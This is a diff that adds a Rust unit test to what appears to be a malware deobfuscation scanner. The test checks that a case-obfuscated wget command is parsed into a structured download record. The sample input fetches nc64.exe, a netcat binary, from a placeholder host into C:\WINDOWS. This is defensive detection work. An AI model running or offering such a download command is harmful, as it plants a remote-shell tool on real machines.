@@ -10845,6 +10845,27 @@ http.send
     }
 
     #[test]
+    fn wget_output_document_separated_value_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"WgEt --OuTpUt-DoCuMeNt C:\WINDOWS\nc64.exe http://%%B/win/nc64.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://%%B/win/nc64.exe"
+                        && dst.as_deref() == Some("C:\\WINDOWS\\nc64.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from separated wget --output-document: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_liberal_url_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
